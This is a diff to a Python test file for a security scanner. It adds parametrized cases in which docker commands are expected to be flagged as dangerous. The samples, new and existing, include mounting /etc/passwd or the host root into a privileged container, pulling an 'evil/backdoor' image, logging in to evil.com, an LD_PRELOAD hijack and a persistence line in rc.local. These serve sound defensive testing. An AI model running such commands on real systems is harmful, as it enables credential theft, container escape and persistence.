@@ -522,6 +522,11 @@ class TestSafetyChecks:
             ("export LD_PRELOAD=/tmp/evil.so\n", "SEC-398"),
             ("crontab curl http://evil.com 4444\n", "SEC-399"),
             ("echo evil >> /etc/rc.local\n", "SEC-400"),
+            ("docker run -v /etc/passwd:/passwd image\n", "SEC-401"),
+            ("docker run --privileged -v /:/host image\n", "SEC-402"),
+            ("docker pull evil/backdoor\n", "SEC-403"),
+            ("docker network connect net container\n", "SEC-404"),
+            ("docker login evil.com -p secret\n", "SEC-405"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
